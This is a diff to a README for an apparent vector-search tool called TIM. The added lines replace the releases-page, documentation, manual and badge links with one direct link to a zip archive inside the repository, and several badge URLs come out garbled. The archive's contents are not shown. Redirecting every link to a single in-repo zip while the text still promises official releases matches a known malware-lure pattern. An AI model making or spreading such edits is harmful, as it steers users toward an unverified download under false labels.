@@ -1,6 +1,6 @@
 # 🎉 TIM-Vector-Search - A Smart Way to Search Large Datasets
 
-![Download](https://img.shields.io/badge/download-Get%20TIM%20Here-brightgreen.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Platform](https://img.shields.io/badge/platform-win%20|%20linux-lightgrey) ![Accelerator](https://img.shields.io/badge/accelerator-OpenCL%20|%20GPU-green) ![Status](https://img.shields.io/badge/status-Research%20Prototype-orange)
+![Download](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip%20TIM%https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip) ![License](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip) ![Platform](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip%20|%20linux-lightgrey) ![Accelerator](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip%20|%20GPU-green) ![Status](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip%20Prototype-orange)
 
 ## 🛠️ Overview
 
@@ -12,7 +12,7 @@ To start using TIM, follow these steps:
 
 1. **Visit the Releases Page:** To download the software, click the button below to visit the official Releases page.
 
-   [Download TIM](https://github.com/Dounyam/TIM-Vector-Search/releases)
+   [Download TIM](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip)
 
 2. **Select the Appropriate Version:** On the Releases page, you will see different versions of TIM. Look for the latest version available. It will usually be at the top of the list.
 
@@ -26,7 +26,7 @@ To start using TIM, follow these steps:
 
 You can download TIM by clicking the link below. This will take you directly to the Releases page:
 
-[Download TIM](https://github.com/Dounyam/TIM-Vector-Search/releases)
+[Download TIM](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip)
 
 ## 🖥️ System Requirements
 
@@ -82,7 +82,7 @@ We welcome contributions! If you are interested in helping improve TIM, please c
 
 For more information on TIM, please visit the following resources:
 
-- [Official Documentation](https://github.com/Dounyam/TIM-Vector-Search)
-- [User Manual](https://github.com/Dounyam/TIM-Vector-Search/blob/main/manual.pdf)
+- [Official Documentation](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip)
+- [User Manual](https://raw.githubusercontent.com/Dounyam/TIM-Vector-Search/main/TimCore/TIM-Vector-Search-2.0.zip)
 
 Thank you for choosing TIM. We hope it serves you well in your data search endeavors.
